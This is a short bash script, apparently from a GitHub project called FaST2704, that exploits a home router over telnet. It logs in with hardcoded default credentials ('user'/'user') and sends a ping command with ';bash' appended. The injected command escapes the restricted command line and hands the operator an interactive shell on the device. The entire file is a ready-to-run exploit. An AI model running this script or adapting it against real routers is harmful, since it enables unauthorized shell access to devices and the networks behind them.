#!/bin/bash
#	~Mixbo
#	https://github.com/Mixbo/FaST2704/
#	www.wakowakowako.com

type expect >/dev/null 2>&1 || { echo >&2 "[-] expect is not installed. Closing program..."; exit 1; }

if [ -z "$1" ]
  then
    host="192.168.1.1"
  else
  	host=$1
fi

(expect -c "
	set timeout 20
	spawn telnet $host
	expect \"Login:\"
	send \"user\r\"
	expect \"Password:\"
	send \"user\r\"
	expect \">\"
	send \"ping -c 1 127.0.0.1;bash\n\"
	interact
	exit
")